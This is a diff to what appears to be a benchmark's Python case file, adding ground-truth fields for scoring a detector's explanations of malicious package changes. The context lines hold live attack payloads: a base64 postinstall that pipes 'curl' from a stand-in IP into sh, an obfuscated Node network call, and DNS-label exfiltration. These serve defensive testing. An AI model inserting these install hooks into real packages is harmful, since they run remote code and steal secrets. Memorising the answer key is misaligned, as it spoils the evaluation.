@@ -45,6 +45,10 @@ class Case:
     files: dict[str, str] = field(default_factory=dict)  # malicious: payload package files
     note: str = ""
     dependency: Dependency | None = None  # malicious: arrives as a dependency bump
+    # P1.5 ground truth for scoring Muse's explanation (optional, attacks only):
+    #   decoded: strings that must appear across Muse's line explanations (obfuscated payloads)
+    #   attributes_to: a package/file a guilty line must name (dependency-delivered attacks)
+    truth: dict = field(default_factory=dict)
 
     @property
     def command(self) -> list[str]:
@@ -284,6 +288,7 @@ MALICIOUS = [
             "postinstall": "echo Y3VybCAtcyAtbSAzIGh0dHA6Ly8yMDMuMC4xMTMuMTAvcCB8IHNo"
                            " | base64 -d | sh || true"})},
         note="base64-decoded command piped to sh",
+        truth={"decoded": ["203.0.113.10"]},  # base64 -> curl http://203.0.113.10/p | sh
     ),
     Case(
         "m05-node-net", "malicious", "Add install-time config check",
@@ -316,6 +321,7 @@ const r = require("ht" + "tp").request({ host: h, path: "/b", timeout: 3000 });
 r.on("error", () => {}); r.on("timeout", () => r.destroy()); r.end();
 """),
         note="address built from char codes, module name split",
+        truth={"decoded": ["203.0.113.10"]},  # fromCharCode(...) -> 203.0.113.10
     ),
     Case(
         "m08-npmrc", "malicious", "Support private registry config",
@@ -356,6 +362,7 @@ const labels = data.match(/.{1,60}/g).slice(0, 3).join(".");
 require("dns").resolve4(labels + ".exfil.invalid", () => {});
 """),
         note="data encoded into DNS labels; no TCP connection at all",
+        truth={"decoded": ["dns", "exfil"]},  # explanation should name DNS-label exfiltration
     ),
     Case(
         "m12-domain-exfil", "malicious", "Fix typo in README", "Fixes a typo.",
@@ -481,10 +488,10 @@ DEPENDABOT_BODY = (
 )
 
 
-def incident(id: str, dep: Dependency, note: str) -> Case:
+def incident(id: str, dep: Dependency, note: str, truth: dict | None = None) -> Case:
     title = f"Bump {dep.name} from {dep.previous} to {dep.version}"
     body = DEPENDABOT_BODY.format(name=dep.name, previous=dep.previous, version=dep.version)
-    return Case(id, "incident", title, body, dependency=dep, note=note)
+    return Case(id, "incident", title, body, dependency=dep, note=note, truth=truth or {})
 
 
 INCIDENTS = [
@@ -500,6 +507,7 @@ INCIDENTS = [
             "preinstall.sh": UA_PARSER_PREINSTALL_SH,
         }),
         "ua-parser-js 0.7.29 (Oct 2021): geofenced miner download via preinstall",
+        truth={"attributes_to": "ua-parser-js", "decoded": ["203.0.113.10"]},
     ),
     incident(
         "r02-shai-hulud",
@@ -512,6 +520,7 @@ INCIDENTS = [
             "bundle.js": SHAI_HULUD_BUNDLE_JS,
         }),
         "Shai-Hulud (Sept 2025): real TruffleHog from GitHub, secrets to webhook.site",
+        truth={"attributes_to": "tinycolor-recon", "decoded": ["webhook.site"]},
     ),
 ]  # fmt: skip
 
